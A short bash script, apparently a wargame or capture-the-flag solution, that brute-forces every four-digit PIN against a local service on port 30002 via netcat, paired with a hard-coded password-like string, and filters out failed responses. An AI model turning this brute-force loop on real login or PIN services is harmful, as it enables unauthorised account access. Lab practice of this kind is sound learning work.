#!/bin/bash

for a in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $a"; done | nc localhost 30002 | grep -v Wrong


